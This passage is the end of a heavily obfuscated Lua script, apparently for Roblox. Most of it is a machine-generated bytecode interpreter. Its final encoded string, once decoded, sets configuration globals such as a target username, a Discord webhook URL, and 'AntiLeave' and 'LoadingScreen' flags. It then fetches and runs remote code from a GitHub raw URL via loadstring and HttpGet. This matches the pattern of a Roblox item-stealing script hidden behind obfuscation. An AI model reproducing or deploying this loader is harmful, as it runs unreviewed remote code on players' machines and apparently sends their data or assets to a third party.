																												v146 = v146 + 1;
																												v154 = v142[v146];
																												v327 = 1;
																											end
																											if (v327 == 1) then
																												v152[v154[793 - (368 + 423)]] = v152[v154[3]];
																												v215 = 8;
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (0 == v214) then
																								v215 = 0;
																								v216 = nil;
																								v214 = 1;
																							end
																						end
																					end
																				elseif (v155 <= 14) then
																					if (v155 > 13) then
																						local v217 = 0;
																						local v218;
																						while true do
																							if (v217 == 0) then
																								v218 = v154[6 - 4];
																								do
																									return v152[v218](v21(v152, v218 + 1, v154[2 + 1]));
																								end
																								break;
																							end
																						end
																					else
																						local v219 = 0;
																						local v220;
																						local v221;
																						while true do
																							if (v219 == 1) then
																								v152[v220 + 1] = v221;
																								v152[v220] = v221[v154[4]];
																								break;
																							end
																							if (0 == v219) then
																								v220 = v154[2];
																								v221 = v152[v154[3]];
																								v219 = 1;
																							end
																						end
																					end
																				elseif (v155 <= 15) then
																					local v222 = 0;
																					local v223;
																					local v224;
																					while true do
																						if (v222 == 0) then
																							v223 = 0;
																							v224 = nil;
																							v222 = 1;
																						end
																						if (v222 == 1) then
																							while true do
																								if (v223 == 0) then
																									v224 = v154[2];
																									v152[v224](v21(v152, v224 + 1, v147));
																									break;
																								end
																							end
																							break;
																						end
																					end
																				elseif (v155 > (27 - 11)) then
																					v152[v154[2]] = v152[v154[3]] % v154[4];
																				else
																					v152[v154[2]] = {};
																				end
																			elseif (v155 <= 26) then
																				if (v155 <= 21) then
																					if (v155 <= 19) then
																						if (v155 == 18) then
																							local v225 = 0;
																							local v226;
																							local v227;
																							while true do
																								if (v225 == 1) then
																									while true do
																										if (v226 == 0) then
																											v227 = v154[2];
																											do
																												return v21(v152, v227, v147);
																											end
																											break;
																										end
																									end
																									break;
																								end
																								if (v225 == 0) then
																									v226 = 0;
																									v227 = nil;
																									v225 = 1;
																								end
																							end
																						else
																							v152[v154[2]] = v152[v154[3]] + v154[4];
																						end
																					elseif (v155 == 20) then
																						v152[v154[440 - (145 + 293)]] = v154[3] ~= (430 - (44 + 386));
																					else
																						v152[v154[1488 - (998 + 488)]] = v154[1 + 2] + v152[v154[4]];
																					end
																				elseif (v155 <= 23) then
																					if (v155 == (19 + 3)) then
																						v152[v154[2]] = v71[v154[3]];
																					else
																						local v233 = 0;
																						local v234;
																						local v235;
																						local v236;
																						local v237;
																						while true do
																							if (v233 == 2) then
																								while true do
																									if (v234 == 0) then
																										local v330 = 0;
																										while true do
																											if (v330 == 1) then
																												v234 = 1;
																												break;
																											end
																											if (v330 == 0) then
																												v235 = v143[v154[3]];
																												v236 = nil;
																												v330 = 1;
																											end
																										end
																									end
																									if (2 == v234) then
																										for v351 = 1, v154[4] do
																											local v352 = 0;
																											local v353;
																											local v354;
																											while true do
																												if (v352 == 0) then
																													v353 = 0;
																													v354 = nil;
																													v352 = 1;
																												end
																												if (v352 == 1) then
																													while true do
																														if (v353 == 0) then
																															local v581 = 0;
																															while true do
																																if (1 == v581) then
																																	v353 = 1;
																																	break;
																																end
																																if (v581 == 0) then
																																	v146 = v146 + 1;
																																	v354 = v142[v146];
																																	v581 = 1;
																																end
																															end
																														end
																														if (v353 == 1) then
																															if (v354[773 - (201 + 571)] == 28) then
																																v237[v351 - 1] = {v152,v354[3]};
																															else
																																v237[v351 - 1] = {v70,v354[3]};
																															end
																															v151[#v151 + 1] = v237;
																															break;
																														end
																													end
																													break;
																												end
																											end
																										end
																										v152[v154[2]] = v42(v235, v236, v71);
																										break;
																									end
																									if (v234 == 1) then
																										local v332 = 0;
																										while true do
																											if (v332 == 1) then
																												v234 = 2;
																												break;
																											end
																											if (v332 == 0) then
																												v237 = {};
																												v236 = v18({}, {[v7("\141\60\212\55\31\232\102", "\30\210\99\189\89\123\141")]=function(v553, v554)
																													local v555 = 0;
																													local v556;
																													while true do
																														if (0 == v555) then
																															v556 = v237[v554];
																															return v556[1][v556[2]];
																														end
																													end
																												end,[v7("\210\2\31\79\228\120\248\85\232\37", "\49\141\93\113\42\147\17\150")]=function(v557, v558, v559)
																													local v560 = 0;
																													local v561;
																													while true do
																														if (v560 == 0) then
																															v561 = v237[v558];
																															v561[1][v561[2]] = v559;
																															break;
																														end
																													end
																												end});
																												v332 = 1;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v233 == 0) then
																								v234 = 0;
																								v235 = nil;
																								v233 = 1;
																							end
																							if (1 == v233) then
																								v236 = nil;
																								v237 = nil;
																								v233 = 2;
																							end
																						end
																					end
																				elseif (v155 <= 24) then
																					local v238 = 0;
																					local v239;
																					local v240;
																					while true do
																						if (v238 == 0) then
																							v239 = 0;
																							v240 = nil;
																							v238 = 1;
																						end
																						if (v238 == 1) then
																							while true do
																								if (0 == v239) then
																									v240 = v154[2];
																									v152[v240] = v152[v240](v21(v152, v240 + (1139 - (116 + 1022)), v154[3]));
																									break;
																								end
																							end
																							break;
																						end
																					end
																				elseif (v155 == 25) then
																					v152[v154[2]] = v152[v154[3]] % v152[v154[16 - 12]];
																				else
																					local v263 = 0;
																					local v264;
																					local v265;
																					local v266;
																					local v267;
																					local v268;
																					while true do
																						if (v263 == 0) then
																							v264 = 0;
																							v265 = nil;
																							v263 = 1;
																						end
																						if (v263 == 1) then
																							v266 = nil;
																							v267 = nil;
																							v263 = 2;
																						end
																						if (v263 == 2) then
																							v268 = nil;
																							while true do
																								if (v264 == 3) then
																									local v358 = 0;
																									while true do
																										if (v358 == 1) then
																											v146 = v146 + 1;
																											v264 = 4;
																											break;
																										end
																										if (v358 == 0) then
																											v265 = 0;
																											for v576 = v268, v147 do
																												local v577 = 0;
																												local v578;
																												while true do
																													if (v577 == 0) then
																														v578 = 0;
																														while true do
																															if (v578 == 0) then
																																v265 = v265 + 1;
																																v152[v576] = v266[v265];
																																break;
																															end
																														end
																														break;
																													end
																												end
																											end
																											v358 = 1;
																										end
																									end
																								end
																								if (0 == v264) then
																									local v359 = 0;
																									while true do
																										if (v359 == 0) then
																											v265 = nil;
																											v266, v267 = nil;
																											v359 = 1;
																										end
																										if (v359 == 1) then
																											v268 = nil;
																											v264 = 1;
																											break;
																										end
																									end
																								end
																								if (v264 == 6) then
																									v146 = v146 + 1;
																									v154 = v142[v146];
																									do
																										return;
																									end
																									break;
																								end
																								if (v264 == 2) then
																									local v361 = 0;
																									while true do
																										if (v361 == 1) then
																											v147 = (v267 + v268) - (3 - 2);
																											v264 = 3;
																											break;
																										end
																										if (v361 == 0) then
																											v268 = v154[2];
																											v266, v267 = v145(v152[v268](v21(v152, v268 + 1, v154[3])));
																											v361 = 1;
																										end
																									end
																								end
																								if (v264 == 4) then
																									local v362 = 0;
																									while true do
																										if (v362 == 1) then
																											v152[v268] = v152[v268](v21(v152, v268 + 1, v147));
																											v264 = 5;
																											break;
																										end
																										if (0 == v362) then
																											v154 = v142[v146];
																											v268 = v154[2];
																											v362 = 1;
																										end
																									end
																								end
																								if (v264 == 5) then
																									local v363 = 0;
																									while true do
																										if (v363 == 0) then
																											v146 = v146 + 1;
																											v154 = v142[v146];
																											v363 = 1;
																										end
																										if (v363 == 1) then
																											v152[v154[2]]();
																											v264 = 6;
																											break;
																										end
																									end
																								end
																								if (v264 == 1) then
																									local v364 = 0;
																									while true do
																										if (v364 == 1) then
																											v154 = v142[v146];
																											v264 = 2;
																											break;
																										end
																										if (v364 == 0) then
																											v152[v154[2]] = v154[3] ~= (0 + 0);
																											v146 = v146 + 1;
																											v364 = 1;
																										end
																									end
																								end
																							end
																							break;
																						end
																					end
																				end
																			elseif (v155 <= 30) then
																				if (v155 <= 28) then
																					if (v155 > (95 - 68)) then
																						v152[v154[2]] = v152[v154[3]];
																					else
																						local v243 = 0;
																						local v244;
																						local v245;
																						local v246;
																						local v247;
																						while true do
																							if (v243 == 2) then
																								while true do
																									if (v244 == 4) then
																										v246 = v152[v247];
																										v245 = v152[v247 + 1 + 1];
																										if (v245 > 0) then
																											if (v246 > v152[v247 + 1 + 0]) then
																												v146 = v154[3];
																											else
																												v152[v247 + 3] = v246;
																											end
																										elseif (v246 < v152[v247 + (886 - (261 + 624))]) then
																											v146 = v154[3];
																										else
																											v152[v247 + 3] = v246;
																										end
																										break;
																									end
																									if (v244 == 0) then
																										local v337 = 0;
																										while true do
																											if (v337 == 1) then
																												v247 = nil;
																												v152[v154[2]] = {};
																												v337 = 2;
																											end
																											if (v337 == 2) then
																												v244 = 1;
																												break;
																											end
																											if (v337 == 0) then
																												v245 = nil;
																												v246 = nil;
																												v337 = 1;
																											end
																										end
																									end
																									if (v244 == 3) then
																										local v338 = 0;
																										while true do
																											if (v338 == 2) then
																												v244 = 4;
																												break;
																											end
																											if (v338 == 1) then
																												v154 = v142[v146];
																												v247 = v154[2];
																												v338 = 2;
																											end
																											if (v338 == 0) then
																												v152[v154[2]] = v154[3];
																												v146 = v146 + 1;
																												v338 = 1;
																											end
																										end
																									end
																									if (1 == v244) then
																										local v339 = 0;
																										while true do
																											if (v339 == 0) then
																												v146 = v146 + (860 - (814 + 45));
																												v154 = v142[v146];
																												v339 = 1;
																											end
																											if (v339 == 1) then
																												v152[v154[4 - 2]] = v154[3];
																												v146 = v146 + 1;
																												v339 = 2;
																											end
																											if (v339 == 2) then
																												v244 = 2;
																												break;
																											end
																										end
																									end
																									if (2 == v244) then
																										local v340 = 0;
																										while true do
																											if (0 == v340) then
																												v154 = v142[v146];
																												v152[v154[2]] = #v152[v154[3]];
																												v340 = 1;
																											end
																											if (v340 == 2) then
																												v244 = 3;
																												break;
																											end
																											if (1 == v340) then
																												v146 = v146 + 1;
																												v154 = v142[v146];
																												v340 = 2;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v243 == 0) then
																								v244 = 0;
																								v245 = nil;
																								v243 = 1;
																							end
																							if (v243 == 1) then
																								v246 = nil;
																								v247 = nil;
																								v243 = 2;
																							end
																						end
																					end
																				elseif (v155 == (50 - 21)) then
																					do
																						return;
																					end
																				else
																					v152[v154[2]] = #v152[v154[1083 - (1020 + 60)]];
																				end
																			elseif (v155 <= 32) then
																				if (v155 == 31) then
																					v146 = v154[3];
																				else
																					v152[v154[2]]();
																				end
																			elseif (v155 <= 33) then
																				local v250 = 0;
																				local v251;
																				local v252;
																				local v253;
																				while true do
																					if (1 == v250) then
																						v253 = nil;
																						while true do
																							if (v251 == 6) then
																								local v341 = 0;
																								while true do
																									if (v341 == 0) then
																										v146 = v146 + (3 - 2);
																										v154 = v142[v146];
																										v341 = 1;
																									end
																									if (v341 == 2) then
																										v251 = 7;
																										break;
																									end
																									if (v341 == 1) then
																										v152[v154[2]] = v71[v154[3]];
																										v146 = v146 + 1;
																										v341 = 2;
																									end
																								end
																							end
																							if (v251 == 0) then
																								local v342 = 0;
																								while true do
																									if (v342 == 0) then
																										v252 = nil;
																										v253 = nil;
																										v342 = 1;
																									end
																									if (v342 == 1) then
																										v71[v154[3]] = v152[v154[2]];
																										v146 = v146 + 1;
																										v342 = 2;
																									end
																									if (v342 == 2) then
																										v251 = 1;
																										break;
																									end
																								end
																							end
																							if (v251 == 2) then
																								local v343 = 0;
																								while true do
																									if (v343 == 0) then
																										v152[v154[2]][v154[3]] = v154[4];
																										v146 = v146 + 1;
																										v343 = 1;
																									end
																									if (v343 == 1) then
																										v154 = v142[v146];
																										v152[v154[2]] = v71[v154[3]];
																										v343 = 2;
																									end
																									if (v343 == 2) then
																										v251 = 3;
																										break;
																									end
																								end
																							end
																							if (1 == v251) then
																								local v344 = 0;
																								while true do
																									if (1 == v344) then
																										v146 = v146 + 1;
																										v154 = v142[v146];
																										v344 = 2;
																									end
																									if (v344 == 0) then
																										v154 = v142[v146];
																										v152[v154[2]] = v71[v154[3]];
																										v344 = 1;
																									end
																									if (v344 == 2) then
																										v251 = 2;
																										break;
																									end
																								end
																							end
																							if (v251 == 3) then
																								local v345 = 0;
																								while true do
																									if (v345 == 0) then
																										v146 = v146 + 1;
																										v154 = v142[v146];
																										v345 = 1;
																									end
																									if (v345 == 1) then
																										v152[v154[2]][v154[3]] = v154[4];
																										v146 = v146 + 1;
																										v345 = 2;
																									end
																									if (v345 == 2) then
																										v251 = 4;
																										break;
																									end
																								end
																							end
																							if (v251 == 7) then
																								local v346 = 0;
																								while true do
																									if (v346 == 0) then
																										v154 = v142[v146];
																										v253 = v154[2];
																										v346 = 1;
																									end
																									if (2 == v346) then
																										v251 = 8;
																										break;
																									end
																									if (v346 == 1) then
																										v252 = v152[v154[3]];
																										v152[v253 + 1] = v252;
																										v346 = 2;
																									end
																								end
																							end
																							if (v251 == 4) then
																								local v347 = 0;
																								while true do
																									if (0 == v347) then
																										v154 = v142[v146];
																										v152[v154[2]] = v71[v154[3]];
																										v347 = 1;
																									end
																									if (v347 == 2) then
																										v251 = 5;
																										break;
																									end
																									if (1 == v347) then
																										v146 = v146 + 1;
																										v154 = v142[v146];
																										v347 = 2;
																									end
																								end
																							end
																							if (v251 == 8) then
																								v152[v253] = v252[v154[4]];
																								break;
																							end
																							if (v251 == 5) then
																								local v350 = 0;
																								while true do
																									if (v350 == 1) then
																										v154 = v142[v146];
																										v152[v154[1425 - (630 + 793)]] = v71[v154[3]];
																										v350 = 2;
																									end
																									if (v350 == 2) then
																										v251 = 6;
																										break;
																									end
																									if (0 == v350) then
																										v152[v154[2]][v154[3]] = v154[4];
																										v146 = v146 + 1;
																										v350 = 1;
																									end
																								end
																							end
																						end
																						break;
																					end
																					if (v250 == 0) then
																						v251 = 0;
																						v252 = nil;
																						v250 = 1;
																					end
																				end
																			elseif (v155 == 34) then
																				local v269 = 0;
																				local v270;
																				local v271;
																				local v272;
																				local v273;
																				local v274;
																				while true do
																					if (v269 == 1) then
																						v272 = nil;
																						v273 = nil;
																						v269 = 2;
																					end
																					if (v269 == 2) then
																						v274 = nil;
																						while true do
																							if (v270 == 1) then
																								local v365 = 0;
																								while true do
																									if (v365 == 1) then
																										v270 = 2;
																										break;
																									end
																									if (v365 == 0) then
																										v147 = (v273 + v271) - 1;
																										v274 = 0;
																										v365 = 1;
																									end
																								end
																							end
																							if (v270 == 2) then
																								for v528 = v271, v147 do
																									local v529 = 0;
																									while true do
																										if (0 == v529) then
																											v274 = v274 + 1;
																											v152[v528] = v272[v274];
																											break;
																										end
																									end
																								end
																								break;
																							end
																							if (v270 == 0) then
																								local v366 = 0;
																								while true do
																									if (v366 == 0) then
																										v271 = v154[2];
																										v272, v273 = v145(v152[v271](v152[v271 + 1]));
																										v366 = 1;
																									end
																									if (v366 == 1) then
																										v270 = 1;
																										break;
																									end
																								end
																							end
																						end
																						break;
																					end
																					if (v269 == 0) then
																						v270 = 0;
																						v271 = nil;
																						v269 = 1;
																					end
																				end
																			else
																				local v275 = 0;
																				local v276;
																				local v277;
																				local v278;
																				local v279;
																				local v280;
																				while true do
																					if (v275 == 0) then
																						v276 = 0;
																						v277 = nil;
																						v275 = 1;
																					end
																					if (v275 == 2) then
																						v280 = nil;
																						while true do
																							if (0 == v276) then
																								local v367 = 0;
																								while true do
																									if (v367 == 0) then
																										v277 = v154[2];
																										v278, v279 = v145(v152[v277](v21(v152, v277 + 1, v147)));
																										v367 = 1;
																									end
																									if (v367 == 1) then
																										v276 = 1;
																										break;
																									end
																								end
																							end
																							if (v276 == 1) then
																								local v368 = 0;
																								while true do
																									if (v368 == 1) then
																										v276 = 2;
																										break;
																									end
																									if (0 == v368) then
																										v147 = (v279 + v277) - 1;
																										v280 = 0;
																										v368 = 1;
																									end
																								end
																							end
																							if (v276 == 2) then
																								for v530 = v277, v147 do
																									local v531 = 0;
																									local v532;
																									while true do
																										if (v531 == 0) then
																											v532 = 0;
																											while true do
																												if (v532 == 0) then
																													v280 = v280 + 1;
																													v152[v530] = v278[v280];
																													break;
																												end
																											end
																											break;
																										end
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																					if (v275 == 1) then
																						v278 = nil;
																						v279 = nil;
																						v275 = 2;
																					end
																				end
																			end
																			v146 = v146 + 1;
																			break;
																		end
																	end
																end
																break;
															end
															if (v141 == 4) then
																v153 = (v150 - v144) + 1;
																v154 = nil;
																v155 = nil;
																v141 = 5;
															end
															if (v141 == 0) then
																v142 = v74;
																v143 = v75;
																v144 = v76;
																v141 = 1;
															end
															if (v141 == 3) then
																v151 = {};
																v152 = {};
																for v158 = 0, v150 do
																	if (v158 >= v144) then
																		v148[v158 - v144] = v149[v158 + 1];
																	else
																		v152[v158] = v149[v158 + 1];
																	end
																end
																v141 = 4;
															end
														end
													end;
												end
											end
										end
										if (v73 == 0) then
											local v127 = 0;
											while true do
												if (v127 == 1) then
													v73 = 1;
													break;
												end
												if (v127 == 0) then
													v74 = v69[1];
													v75 = v69[2];
													v127 = 1;
												end
											end
										end
										break;
									end
								end
							end
							break;
						end
						if (v72 == 0) then
							v73 = 0;
							v74 = nil;
							v72 = 1;
						end
					end
				end
				return v42(v41(), {}, v29)(...);
			end
			if (2 == v30) then
				function v35()
					local v77 = 0;
					local v78;
					local v79;
					while true do
						if (v77 == 1) then
							return (v79 * (659 - 403)) + v78;
						end
						if (0 == v77) then
							v78, v79 = v9(v28, v31, v31 + 2);
							v31 = v31 + 2;
							v77 = 1;
						end
					end
				end
				v36 = nil;
				function v36()
					local v80 = 0;
					local v81;
					local v82;
					local v83;
					local v84;
					local v85;
					while true do
						if (v80 == 0) then
							v81 = 0;
							v82 = nil;
							v80 = 1;
						end
						if (v80 == 2) then
							v85 = nil;
							while true do
								local v115 = 0;
								while true do
									if (0 == v115) then
										if (v81 == 0) then
											local v128 = 0;
											while true do
												if (1 == v128) then
													v81 = 1;
													break;
												end
												if (v128 == 0) then
													v82, v83, v84, v85 = v9(v28, v31, v31 + (622 - (555 + 64)));
													v31 = v31 + 4;
													v128 = 1;
												end
											end
										end
										if (1 == v81) then
											return (v85 * 16777216) + (v84 * 65536) + (v83 * 256) + v82;
										end
										break;
									end
								end
							end
							break;
						end
						if (v80 == 1) then
							v83 = nil;
							v84 = nil;
							v80 = 2;
						end
					end
				end
				v37 = nil;
				v30 = 3;
			end
			if (v30 == 0) then
				v31 = 1;
				v32 = nil;
				v28 = v12(v11(v28, 15 - 10), v7("\96\202", "\43\78\228\33\56\98\229"), function(v86)
					if (v9(v86, 2) == (226 - 147)) then
						local v93 = 0;
						local v94;
						while true do
							if (v93 == 0) then
								v94 = 0;
								while true do
									if (0 == v94) then
										local v120 = 0;
										while true do
											if (v120 == 0) then
												v32 = v8(v11(v86, 1 - 0, 1));
												return "";
											end
										end
									end
								end
								break;
							end
						end
					else
						local v95 = 0;
						local v96;
						local v97;
						while true do
							if (1 == v95) then
								while true do
									if (0 == v96) then
										v97 = v10(v8(v86, 16));
										if v32 then
											local v131 = 0;
											local v132;
											while true do
												if (v131 == 1) then
													return v132;
												end
												if (v131 == 0) then
													v132 = v13(v97, v32);
													v32 = nil;
													v131 = 1;
												end
											end
										else
											return v97;
										end
										break;
									end
								end
								break;
							end
							if (v95 == 0) then
								v96 = 0;
								v97 = nil;
								v95 = 1;
							end
						end
					end
				end);
				v33 = nil;
				v30 = 1;
			end
		end
	end
	v23("LOL!1C3O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365724E616D6503073O00DAC9E432EABFC903083O007EB1A3BB4586DBA703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3132373935363133313338363439303839312F4F2D75597535497267434D6D5763436B6F58426664577A65412D3632524B4862544E35676648454D4E32385949795442557166447563676849685953414E466E374C4F3303093O00557365724E616D653203073O0028C715D2F027C303053O009C43AD4AA503023O005F47030D3O004C6F6164696E675363722O656E2O0103093O00416E74694C6561766503093O004D6F7573654C6F636B0100030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269536372697074732F6D61696E2F4D6F72695363726970745A00313O0012053O00013O00206O000200122O000100013O00202O00010001000300122O000200013O00202O00020002000400122O000300053O00062O0003000A0001000100041F3O000A0001001216000300063O002001000400030007001216000500083O002001000500050009001216000600083O00200100060006000A00061700073O000100062O001C3O00064O001C8O001C3O00044O001C3O00014O001C3O00024O001C3O00054O000B000800073O00122O0009000C3O00122O000A000D6O0008000A000200122O0008000B3O00122O0008000F3O00122O0008000E6O000800073O00122O000900113O00122O000A00124O00180008000A0002001221000800103O00122O000800133O00302O00080014001500122O000800133O00302O00080016001500122O000800133O00302O00080017001800122O000800193O00122O0009001A3O00202O00090009001B001209000B001C4O001A000C00016O0009000C6O00083O00024O0008000100016O00013O00013O00023O00026O00F03F026O00704002264O001B00025O00122O000300016O00045O00122O000500013O00042O0003002100014O00076O0004000800026O000900016O000A00026O000B00036O000C00046O000D8O000E00063O00202O000F000600014O000C000F6O000B3O00024O000C00036O000D00046O000E00016O000F00016O000F0006000F00102O000F0001000F4O001000016O00100006001000102O00100001001000202O0010001000014O000D00106O000C8O000A3O000200202O000A000A00024O0009000A6O00073O00010004060003000500014O000300054O001C000400024O000E000300044O001200036O001D3O00017O00", v17(), ...);
end
